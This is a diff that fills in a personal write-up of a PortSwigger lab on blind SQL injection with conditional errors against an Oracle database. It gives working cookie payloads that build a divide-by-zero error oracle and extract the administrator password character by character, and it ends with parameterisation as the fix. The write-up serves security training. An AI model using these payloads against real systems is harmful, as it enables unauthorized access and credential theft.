@@ -1,38 +1,104 @@
 ---
 title: Blind SQL injection with conditional errors
-date: '2025-06-18'
+date: '2026-07-13'
 tags:
   - PortSwigger
   - lab
   - sql-injection
   - walkthrough
-excerpt: >-
-  PortSwigger Web Security Academy lab — Blind SQL injection with conditional
-  errors. Walkthrough with solution, key takeaways, and blind replay exercise.
+excerpt: "The response never changes, only its status code: an Oracle CASE wrapping TO_CHAR(1/0) throws a 500 when my guess is right and a 200 when it is not."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
 
 # Lab: Blind SQL injection with conditional errors
 
-## Objective
+The page gives away nothing here, not even a changed line of text. The only lever is a status code. So instead of asking whether rows come back, I make the database explode on purpose and watch for a 500.
 
-*Describe the labs objective here*
+## The setup
 
-## Solution Reconstruction
+`TrackingId` cookie again. No `Welcome back`, nothing reflected. The one thing I notice is that a syntax-breaking cookie returns a custom error page with a 500, while a well-formed cookie returns 200. The hint also says Oracle, which matters for the payload later.
 
-- [ ] Step 1:
-- [ ] Step 2:
-- [ ] Step 3:
-- [ ] Final payload / exploit:
+## How the vulnerability works
 
-## Key Takeaway
+The cookie sits inside a quoted string. Because the database is Oracle, I can append `||` and a subquery and then reopen the string, so the database evaluates my expression and concatenates its result back into the value. If that subquery errors, the whole statement errors and I get a 500.
 
-*Write ONE principle I must remember*
+So I write a subquery that errors only when my condition is true. A `CASE` with a deliberate divide-by-zero does it, because `TO_CHAR(1/0)` raises the moment it is evaluated. Oracle shows up again here: the subquery needs a `FROM`, and it has to collapse to a single row and single column, or the concatenation breaks on its own.
 
-## Next-Day Blind Replay
+## Solving it
 
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+1. Confirm the channel. A stray quote errors, a doubled quote does not:
+
+   ```
+   TrackingId=xyz'
+   TrackingId=xyz''
+   ```
+
+2. Prove the query is valid SQL and the DB is Oracle by concatenating a subquery that needs a table:
+
+   ```
+   TrackingId=xyz'||(SELECT '' FROM dual)||'
+   ```
+
+   No error means Oracle. Remove the `FROM dual` and it errors, which is the tell.
+
+3. Build the error oracle. True triggers the divide-by-zero, false stays clean:
+
+   ```
+   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+   TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+   ```
+
+   The first gives a 500, the second a 200.
+
+4. Swap in `LENGTH` to measure the password:
+
+   ```
+   TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+   ```
+
+5. Extract each character in Intruder, marking the candidate and sorting on a 500 status:
+
+   ```
+   TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+   ```
+
+   The row with the 500 is the right character. Step through the positions to rebuild the password, then log in as `administrator`.
+
+## Why that payload works
+
+Two Oracle facts carry this lab. First, `||` concatenates, so I can splice a subquery into the middle of the string value and have it evaluated, leaving the string syntactically valid on both sides. Second, `TO_CHAR(1/0)` really does raise a division-by-zero error, so a `CASE` that reaches it forces the whole request to 500. `CASE WHEN <condition>` picks the error branch when true and the harmless empty string when false, so the fault is entirely under my control and carries no data itself, only a yes or no. The `FROM users WHERE username='administrator'` pins the subquery to one row, and `FROM dual` is the fallback when there is no table to read.
+
+## The fix
+
+Parameterise the cookie. The point worth keeping is that even with errors suppressed and no data reflected, a condition that changes whether the query errors is still an exfiltration channel. Bind the value and there is no expression to smuggle.
+
+<MatchPairs
+  title="Conditional-error vocabulary"
+  pairs={[
+    { term: "||", match: "Oracle string concatenation, splices my subquery into the value" },
+    { term: "TO_CHAR(1/0)", match: "a divide-by-zero that raises only when evaluated" },
+    { term: "CASE WHEN", match: "branches on my condition, error or harmless string" },
+    { term: "dual", match: "one-row table so the subquery has a FROM to point at" },
+    { term: "500", match: "the status returned when the injected condition is true" }
+  ]}
+/>
+
+<Sequence
+  title="Order of the attack"
+  steps={[
+    "Confirm a syntax error gives a 500, and a doubled quote does not",
+    "Prove the query is valid SQL with (SELECT '' FROM dual)",
+    "Wrap the condition in CASE so true raises TO_CHAR(1/0)",
+    "Find the password length with LENGTH()",
+    "Brute-force each character with SUBSTR() and watch for the 500 row",
+    "Log in as administrator"
+  ]}
+/>
+
+<Cloze
+  title="Payload recall"
+  text="To trip an Oracle error only when my condition is true, I branch inside {{CASE WHEN}} and evaluate {{TO_CHAR(1/0)}} on the true path."
+/>
